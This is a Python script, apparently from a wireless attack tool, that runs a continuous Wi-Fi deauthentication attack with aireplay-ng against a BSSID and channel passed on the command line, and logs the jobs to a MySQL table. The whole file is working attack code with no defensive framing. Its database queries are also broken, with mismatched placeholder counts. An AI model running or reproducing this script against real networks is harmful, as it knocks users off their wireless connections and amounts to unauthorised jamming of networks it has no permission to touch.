import pyrcrack
import config
import asyncio
import subprocess
import sys
import time
import mysql.connector

mysqlConfig = config.mysqlConfig()
pathConfig  = config.filepathConfig()
airmon = pyrcrack.AirmonNg()
driver  = pathConfig['driver']
scannerInterface=""
attackerInterface=""
bssid = sys.argv[1]
channel = sys.argv[2]

mysqlDb = mysql.connector.connect(
  host=mysqlConfig["host"],
  user=mysqlConfig["user"],
  database = mysqlConfig["db"],
  password=mysqlConfig["password"],
  auth_plugin='mysql_native_password'
)

mysqlCursor = mysqlDb.cursor(buffered=True)

def saveToDb():
	try:
		queryInsert = "INSERT INTO deauth_jobs (`id_devices`,`target`,`channel`,`status`,`pid`) VALUES (%s,%s,%s,%s)"
		data = ( bssid, channel, 'notstarted', 10)
		mysqlCursor.execute(queryInsert, data)
		mysqlDb.commit()
		print("Insert Database successfully")
	except Exception as e:
		print(f"Error Insert database: {e}")
	

def updateDb():
	try:	
		queryInsert = "UPDATE deauth_jobs SET status = %s WHERE id_devices = %s"
		data = ('started',)
		mysqlCursor.execute(queryInsert, data)
		mysqlDb.commit()
		print("Update Database Sucsessfully")
	except Exception as e :
		print(f"Error Update Database: {e}")


	 
async def deauth():
	for a in await airmon.interfaces:
		global scannerInterface
		global attackerInterface
		if a.asdict()['driver']==driver:
			if scannerInterface=="":
				attackerInterface=a.asdict()['interface']
				#print("scanner",scannerInterface)
			elif scannerInterface !=a.asdict()['interface']:
				attackerInterface=a.asdict()['interface']
				#print("attack",attackerInterface);

	#commnad for channel active
	# airodump_process = subprocess.Popen(['sudo', 'airodump-ng', attackerInterface, '--bssid', bssid, '--channel', channel])
	setChannel = subprocess.Popen(['sudo', 'iw', 'dev', attackerInterface, 'set', 'channel', channel])
	# saveToDb()
	time.sleep(1)
	while True:
		# command for deauth bssid
		command = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid ,attackerInterface]
		aireplay_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
		# updateDb()
		return_code = aireplay_process.wait()
		if return_code != 1:
			# updateDb()
			break
		else:
			print("bssid not detected")

	setChannel.wait()
if __name__ == '__main__':
	print("scanner",  scannerInterface)
	asyncio.run(deauth())
